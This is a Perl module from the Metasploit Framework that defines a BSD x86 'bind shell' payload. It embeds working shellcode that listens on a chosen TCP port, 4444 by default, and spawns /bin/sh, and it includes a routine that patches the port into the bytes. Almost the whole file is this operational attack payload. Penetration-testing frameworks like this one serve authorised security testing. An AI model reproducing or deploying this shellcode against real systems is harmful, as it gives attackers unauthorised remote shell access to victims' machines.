
##
# This file is part of the Metasploit Framework and may be redistributed
# according to the licenses defined in the Authors field below. In the
# case of an unknown or missing license, this file defaults to the same
# license as the core Framework (dual GPLv2 and Artistic). The latest
# version of the Framework can always be obtained from metasploit.com.
##

package Msf::Payload::bsdx86_bind;
use strict;
use base 'Msf::PayloadComponent::BindConnection';

my $info =
{
  'Name'         => 'BSD Bind Shell',
  'Version'      => '$Revision$',
  'Description'  => 'Listen for connection and spawn a shell',
  'Authors'      => [ 'LSD [Unknown License]', ],
  'Arch'         => [ 'x86' ],
  'Priv'         => 0,
  'OS'           => [ 'bsd' ],
  'Size'         => '',
};

sub new {
  my $class = shift;
  my $hash = @_ ? shift : { };
  $hash = $class->MergeHashRec($hash, {'Info' => $info});
  my $self = $class->SUPER::new($hash, @_);

  $self->_Info->{'Size'} = $self->_GenSize;
  return($self);
}

sub Build {
  my $self = shift;
  return($self->Generate($self->GetVar('LPORT')));
}

sub Generate {
  my $self = shift;
  my $port = shift;
  my $off_port = 17;
  my $port_bin = pack('n', $port);

  my $shellcode = # bsd bind shell by vlad902
    "\x6a\x61\x58\x99\x52\x42\x52\x42\x52\x31\xc9\x51\xcd\x80\x68\x10".
    "\x02\x04\x57\x89\xe3\x6a\x10\x53\x50\x50\x93\x6a\x68\x58\xcd\x80".
    "\xb0\x6a\x51\xcd\x80\x51\x53\xb0\x1e\x50\xcd\x80\x93\x6a\x5a\x58".
    "\x52\x53\x51\xcd\x80\x4a\x79\xf5\x68\x6e\x2f\x73\x68\x68\x2f\x2f".
    "\x62\x69\x89\xe3\x51\x54\x53\xb0\x3b\x50\xcd\x80";


  substr($shellcode, $off_port, 2, $port_bin);
  return($shellcode);
}

sub _GenSize {
  my $self = shift;
  my $bin = $self->Generate('4444');
  return(length($bin));
}

1;
